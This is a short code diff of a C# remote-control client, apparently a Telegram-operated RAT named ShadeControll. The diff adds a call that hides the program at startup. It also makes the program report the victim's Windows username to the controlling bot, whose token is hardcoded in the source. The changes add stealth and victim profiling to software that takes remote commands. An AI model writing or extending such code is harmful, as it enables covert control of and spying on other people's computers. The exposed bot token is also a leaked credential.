@@ -14,6 +14,8 @@ namespace ShadeControll
 
         static void Main()
         {
+            Ninja.Hide();
+
             Client = new TelegramClient("1774037430:AAHnjjeOUNvn-ZpyCCo_6mIhztp_GkagsVg");
 
             while(!Client.Connect())
@@ -21,7 +23,7 @@ namespace ShadeControll
                 Console.WriteLine("Connecting..");
                 Thread.Sleep(1000);
             }
-            Client.SendMessage("Połączono z Komputerem");
+            Client.SendMessage("Połączono z Komputerem - " + Environment.UserName);
             Client.NewMessage += Client_NewMessage;
 
             while (true) { Thread.Sleep(1000); }
